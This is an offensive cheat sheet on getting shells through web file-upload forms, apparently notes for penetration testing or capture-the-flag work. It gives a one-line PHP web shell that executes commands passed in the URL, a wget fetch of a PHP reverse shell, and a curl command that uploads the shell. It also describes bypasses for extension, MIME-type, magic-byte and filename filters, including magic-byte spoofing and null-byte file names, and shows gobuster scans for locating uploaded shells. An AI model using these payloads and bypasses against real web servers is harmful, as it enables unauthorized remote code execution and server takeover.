# get shells via file upload. defeat filters, own webserver.

## quick payloads

minimal php shell:
```php
<?php echo system($_GET["c"]); ?>
```

pentestmonkey reverse shell:
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

## common filters encountered

**extension filtering**
- blacklist: blocks `.php`, `.php3`, `.asp`, etc
- whitelist: only allows `.jpg`, `.png`, `.pdf`, etc
- bypass: see `php-upload-bypass.md`

**mime type check**
- validates `Content-Type` header
- bypass: set `Content-Type: image/jpeg` for `.php` files
- easily fooled, only checks declared type

**magic bytes validation**  
- checks file signature (first bytes)
- bypass: prepend valid image header, add php after
- use `hexedit` to modify signatures

**file size limits**
- prevents large payloads
- standard php reverse shell = 5.4kb
- make smaller shells if needed

**filename sanitization**
- blocks special chars, paths
- randomizes uploaded names
- [!] uploaded shells may be renamed - scan for them

## client-side bypass

disable javascript:
- removes frontend validation entirely
- upload directly via curl/burp

direct api calls:
```bash
curl -X POST -F "file=@shell.php" -F "submit=upload" http://target/upload.php
```

## server-side bypass

**magic number spoofing:**
```bash
# add jpeg header to php file
echo -ne '\xff\xd8\xff\xe0' > shell.php.jpg
cat shell.php >> shell.php.jpg
```

**polyglot files:**
- valid image + executable code
- hide php in exif metadata
- [!] some filters check entire file content

**null byte injection:**
- `shell.php%00.jpg` (old php < 5.3.4)
- url encode twice: `shell.php%2500.jpg`

## file discovery post-upload

common upload paths:
```
/uploads/
/assets/
/files/
/media/
/tmp/
/var/www/uploads/
```

scan for uploaded files:
```bash
gobuster dir -u http://target/uploads/ -w /usr/share/wordlists/dirb/common.txt
```

[!] some systems rename uploads - check upload response for hints